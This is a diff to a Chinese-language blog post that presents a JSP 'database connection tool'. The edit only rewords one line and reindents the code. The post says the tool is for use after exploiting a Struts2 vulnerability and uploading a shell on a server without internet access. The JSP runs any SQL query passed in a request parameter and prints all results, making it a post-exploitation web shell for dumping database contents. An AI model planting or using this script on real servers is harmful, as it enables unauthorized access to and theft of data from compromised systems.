@@ -3,7 +3,7 @@ layout: post
 title: Jsp 数据库连接工具
 ---
 
-再玩struts2漏洞的时候,传shell,找数据库配置文件，当没开外网的时候，可以直接用一下脚本。
+再玩struts2漏洞的时候,传shell,找数据库配置文件，当没开外网的时候，可以直接用下面的脚本。
 
 ###
     <%@ page import="java.sql.*" %>
@@ -18,35 +18,35 @@ title: Jsp 数据库连接工具
 
     try {
 
-    String sql = request.getParameter("query");
-    out.println(sql+"</br>");
-    String driver = ""; 
-    String url = "";
-    String username = "";
-    String password = "";
-    Class.forName(driver).newInstance();
-    Connection conn = DriverManager.getConnection(url,username,password);
+        String sql = request.getParameter("query");
+        out.println(sql+"</br>");
+        String driver = ""; 
+        String url = "";
+        String username = "";
+        String password = "";
+        Class.forName(driver).newInstance();
+        Connection conn = DriverManager.getConnection(url,username,password);
     
-    Statement stmt = conn.createStatement();
-    ResultSet rs = stmt.executeQuery(sql);
-    ResultSetMetaData rsmd = rs.getMetaData();
-    int num = rsmd.getColumnCount();
+        Statement stmt = conn.createStatement();
+        ResultSet rs = stmt.executeQuery(sql);
+        ResultSetMetaData rsmd = rs.getMetaData();
+        int num = rsmd.getColumnCount();
     
-    while(rs.next()) {
-        for (int i=1; i<=num; i++){
+        while(rs.next()) {
+            for (int i=1; i<=num; i++){
                      
                     out.println(rs.getString(i)+"&nbsp");
            }
            out.println("</br>");
      }
    
-    rs.close();
-    stmt.close();
-    conn.close();
+        rs.close();
+        stmt.close();
+        conn.close();
 
     } catch (Exception e) {
-      response.setStatus(200);
-      e.printStackTrace();
+        response.setStatus(200);
+        e.printStackTrace();
     }
 
 
